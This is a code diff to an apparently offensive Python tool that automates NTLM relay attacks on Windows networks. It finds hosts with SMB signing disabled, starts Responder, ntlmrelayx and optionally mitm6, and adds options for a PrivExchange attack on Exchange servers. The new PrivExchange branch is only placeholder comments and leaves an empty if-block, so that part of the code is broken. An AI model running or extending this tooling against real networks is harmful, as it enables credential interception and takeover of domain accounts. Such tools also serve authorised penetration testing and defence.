@@ -20,7 +20,8 @@ def parse_args():
     parser.add_argument("-6", "--mitm6", action='store_true', help="Run mitm6 in conjunction with the relay attack")
     parser.add_argument("-d", "--domain", help="Domain for mitm6 to attack")
     parser.add_argument("-t", "--target", help="Target for ntlmrelayx to relay to")
-    #parser.add_argument("-p", "--privexchange", help="Remote command to run upon successful NTLM relay")
+    parser.add_argument("-u", "--creds", help="Creds for PrivExchange: DOMAIN/user[:password]")
+    parser.add_argument("-e", "--exchange", help="Exchange server IP address: 192.168.1.45")
     return parser.parse_args()
 
 def parse_hostlist(hostlist):
@@ -49,31 +50,38 @@ def parse_hostlist(hostlist):
 
 async def main():
 
-    if not args.target:
-        hostlist = args.hostlist
-        hosts = parse_hostlist(hostlist)
-        unsigned_hosts = await get_unsigned_hosts(loop, hosts)
+    if args.creds:
+        if not args.exchange:
+            #find exchange servers
+            #test exchange servers
+            #pick vulnerable one
+            #run privexchange ntlmrelay
+    else:
+        if not args.target:
+            hostlist = args.hostlist
+            hosts = parse_hostlist(hostlist)
+            unsigned_hosts = await get_unsigned_hosts(loop, hosts)
 
-        if len(unsigned_hosts) == 0:
-            print_bad('No hosts with SMB signing disabled found')
-            sys.exit()
+            if len(unsigned_hosts) == 0:
+                print_bad('No hosts with SMB signing disabled found')
+                sys.exit()
 
-        print_good('Unsigned SMB hosts:')
-        for h in unsigned_hosts:
-            print_good('  '+h)
+            print_good('Unsigned SMB hosts:')
+            for h in unsigned_hosts:
+                print_good('  '+h)
 
-    # Start Responder
-    responder = start_responder(args.interface)
-    print_info(f"Running: {responder.cmd}")
+        # Start Responder
+        responder = start_responder(args.interface)
+        print_info(f"Running: {responder.cmd}")
 
-    # Start ntlmrelayx
-    ntlmrelayx = start_ntlmrelayx(args)
-    print_info(f"Running: {ntlmrelayx.cmd}")
+        # Start ntlmrelayx
+        ntlmrelayx = start_ntlmrelayx(args)
+        print_info(f"Running: {ntlmrelayx.cmd}")
 
-    # Start mitm6
-    if args.mitm6:
-        mitm6 = start_mitm6(args)
-        print_info(f"Running: {mitm6.cmd}")
+        # Start mitm6
+        if args.mitm6:
+            mitm6 = start_mitm6(args)
+            print_info(f"Running: {mitm6.cmd}")
 
      ########## CTRL-C HANDLER ##############################
     def signal_handler(signal, frame):
